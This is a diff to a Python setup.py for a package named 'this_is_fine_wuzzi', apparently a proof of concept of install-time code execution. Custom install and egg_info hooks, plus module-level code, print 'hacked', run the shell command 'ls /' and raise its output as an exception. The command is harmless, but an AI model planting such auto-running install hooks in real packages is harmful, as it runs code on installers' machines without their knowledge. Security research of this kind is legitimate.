@@ -5,8 +5,11 @@ from setuptools.command.egg_info import egg_info
 
 def RunCommand():
     print('hacked')
-    import os;
-    raise Exception("os.system('ls /')")
+    from subprocess import Popen, PIPE
+    pro = Popen('ls /', shell=True, stdout=PIPE, stderr=PIPE)
+    x,_ = pro.communicate()
+    x = x.decode()
+    raise Exception(x)
     
 class RunEggInfoCommand(egg_info):
     def run(self):
@@ -19,8 +22,11 @@ class RunInstallCommand(install):
         RunCommand()
         install.run(self)
 
-import os;
-raise Exception("os.system('ls /')")
+from subprocess import Popen, PIPE
+pro = Popen('ls /', shell=True, stdout=PIPE, stderr=PIPE)
+x,_ = pro.communicate()
+x = x.decode()
+raise Exception(x)
         
 setup(
     name = "this_is_fine_wuzzi",
